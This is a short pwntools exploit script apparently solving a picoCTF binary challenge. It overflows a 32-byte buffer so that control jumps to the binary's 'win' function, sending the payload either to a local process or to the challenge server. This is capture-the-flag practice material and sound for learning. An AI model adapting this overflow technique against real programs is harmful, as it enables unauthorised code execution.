#!/usr/bin/env python3

from pwn import *

exe = ELF("./chall")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.GDB:
            gdb.attach(r)
    else:
        r = remote("mimas.picoctf.net", 51852)

    return r


def main():
    r = conn()

    r.recvuntil(b"Enter your choice: ")
    r.sendline(b'2')
    r.recvuntil(b'Data for buffer: ')
    
    payload = b'A' * 32
    payload += p64(exe.sym.win)

    r.sendline(payload)

    r.recvuntil(b"Enter your choice: ")
    r.sendline(b'4')

    r.interactive()


if __name__ == "__main__":
    main()
